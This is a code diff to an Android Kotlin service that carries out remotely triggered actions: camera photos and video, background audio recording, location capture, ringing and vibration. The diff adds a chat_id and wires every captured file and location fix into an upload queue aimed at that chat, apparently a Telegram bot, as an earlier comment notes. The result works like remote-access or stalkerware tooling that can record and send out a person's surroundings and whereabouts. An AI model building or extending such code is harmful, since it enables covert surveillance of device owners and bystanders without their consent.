@@ -8,7 +8,6 @@ import android.media.RingtoneManager
 import android.os.*
 import android.util.Log
 import androidx.core.app.NotificationCompat
-import kotlinx.coroutines.*
 import org.json.JSONObject
 import java.io.File
 import java.io.FileOutputStream
@@ -31,16 +30,17 @@ class ForegroundActionService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val action = intent?.getStringExtra("action") ?: ""
+        val chatId = intent?.getStringExtra("chat_id")
         job?.cancel()
         job = CoroutineScope(Dispatchers.IO).launch {
             try {
                 when (action) {
-                    "photo" -> handleCameraAction("photo", intent)
-                    "video" -> handleCameraAction("video", intent)
-                    "audio" -> handleAudioRecording(intent)
-                    "location" -> handleLocation()
-                    "ring" -> handleRing(intent)
-                    "vibrate" -> handleVibrate(intent)
+                    "photo" -> handleCameraAction("photo", intent, chatId)
+                    "video" -> handleCameraAction("video", intent, chatId)
+                    "audio" -> handleAudioRecording(intent, chatId)
+                    "location" -> handleLocation(chatId)
+                    "ring" -> handleRing() // Always 5 seconds
+                    "vibrate" -> handleVibrate() // Always 2 seconds
                     else -> Log.e("ForegroundActionService", "Unknown action: $action")
                 }
             } catch (e: Exception) {
@@ -52,7 +52,7 @@ class ForegroundActionService : Service() {
         return START_NOT_STICKY
     }
 
-    private suspend fun handleCameraAction(type: String, intent: Intent?) {
+    private suspend fun handleCameraAction(type: String, intent: Intent?, chatId: String?) {
         showCameraOverlay()
         val cameraFacing = intent?.getStringExtra("camera") ?: "rear"
         val flash = intent?.getBooleanExtra("flash", false) ?: false
@@ -77,21 +77,25 @@ class ForegroundActionService : Service() {
         } finally {
             removeCameraOverlay()
         }
-        // TODO: Handle file upload to your own backend or Telegram bot if needed
+        if (result && chatId != null) {
+            UploadManager.queueUpload(outputFile, chatId, type)
+        }
     }
 
-    private suspend fun handleAudioRecording(intent: Intent?) {
+    private suspend fun handleAudioRecording(intent: Intent?, chatId: String?) {
         val duration = intent?.getIntExtra("duration", 60) ?: 60 // Default 1 min
         val outputFile = File(cacheDir, "audio_${nowString()}.m4a")
         try {
             AudioBackgroundHelper.recordAudio(this, outputFile, duration)
-            // TODO: Handle file upload if needed
+            if (chatId != null) {
+                UploadManager.queueUpload(outputFile, chatId, "audio")
+            }
         } catch (e: Exception) {
             Log.e("ForegroundActionService", "Audio error: $e")
         }
     }
 
-    private suspend fun handleLocation() {
+    private suspend fun handleLocation(chatId: String?) {
         try {
             val loc = LocationBackgroundHelper.getLastLocation(this)
             if (loc == null) {
@@ -102,14 +106,16 @@ class ForegroundActionService : Service() {
             FileOutputStream(locationFile).use { out ->
                 out.write("""{"lat":${loc.latitude},"lng":${loc.longitude},"timestamp":${loc.time}}""".toByteArray())
             }
-            // TODO: Handle location file upload if needed
+            if (chatId != null) {
+                UploadManager.queueUpload(locationFile, chatId, "location")
+            }
         } catch (e: Exception) {
             Log.e("ForegroundActionService", "Location error: $e")
         }
     }
 
-    private fun handleRing(intent: Intent?) {
-        val duration = intent?.getIntExtra("duration", 10) ?: 10 // seconds
+    private fun handleRing() {
+        val duration = 5 // seconds, hardcoded as requested
         val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
         val oldVolume = audioManager.getStreamVolume(AudioManager.STREAM_RING)
         val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING)
@@ -126,23 +132,14 @@ class ForegroundActionService : Service() {
         }
     }
 
-    private fun handleVibrate(intent: Intent?) {
-        val duration = intent?.getLongExtra("duration", 1000) ?: 1000L
-        val pattern: LongArray? = intent?.getLongArrayExtra("pattern")
+    private fun handleVibrate() {
+        val duration = 2000L // milliseconds, hardcoded as requested (2s)
         try {
             val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                if (pattern != null) {
-                    vibrator.vibrate(VibrationEffect.createWaveform(pattern, -1))
-                } else {
-                    vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
-                }
+                vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
             } else {
-                if (pattern != null) {
-                    vibrator.vibrate(pattern, -1)
-                } else {
-                    vibrator.vibrate(duration)
-                }
+                vibrator.vibrate(duration)
             }
         } catch (e: Exception) {
             Log.e("ForegroundActionService", "Vibrate error: $e")
@@ -180,7 +177,7 @@ class ForegroundActionService : Service() {
         }
         fun isRunning(context: Context): Boolean = false
 
-        fun startCameraAction(context: Context, type: String, options: JSONObject) {
+        fun startCameraAction(context: Context, type: String, options: JSONObject, chatId: String?) {
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", type)
             intent.putExtra("camera", options.optString("camera", "rear"))
@@ -189,26 +186,29 @@ class ForegroundActionService : Service() {
                 if (options.has("quality")) intent.putExtra("quality", options.optInt("quality", 720))
                 if (options.has("duration")) intent.putExtra("duration", options.optInt("duration", 60))
             }
+            chatId?.let { intent.putExtra("chat_id", it) }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
                 context.startService(intent)
             }
         }
-        fun startAudioAction(context: Context, options: JSONObject) {
+        fun startAudioAction(context: Context, options: JSONObject, chatId: String?) {
             val duration = options.optInt("duration", 60)
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", "audio")
             intent.putExtra("duration", duration)
+            chatId?.let { intent.putExtra("chat_id", it) }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
                 context.startService(intent)
             }
         }
-        fun startLocationAction(context: Context) {
+        fun startLocationAction(context: Context, chatId: String?) {
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", "location")
+            chatId?.let { intent.putExtra("chat_id", it) }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
@@ -218,7 +218,6 @@ class ForegroundActionService : Service() {
         fun startRingAction(context: Context, options: JSONObject) {
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", "ring")
-            if (options.has("duration")) intent.putExtra("duration", options.optInt("duration", 10))
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
@@ -228,14 +227,6 @@ class ForegroundActionService : Service() {
         fun startVibrateAction(context: Context, options: JSONObject) {
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", "vibrate")
-            if (options.has("duration")) intent.putExtra("duration", options.optLong("duration", 1000))
-            if (options.has("pattern")) {
-                val arr = options.optJSONArray("pattern")
-                if (arr != null) {
-                    val pattern = LongArray(arr.length()) { arr.optLong(it) }
-                    intent.putExtra("pattern", pattern)
-                }
-            }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
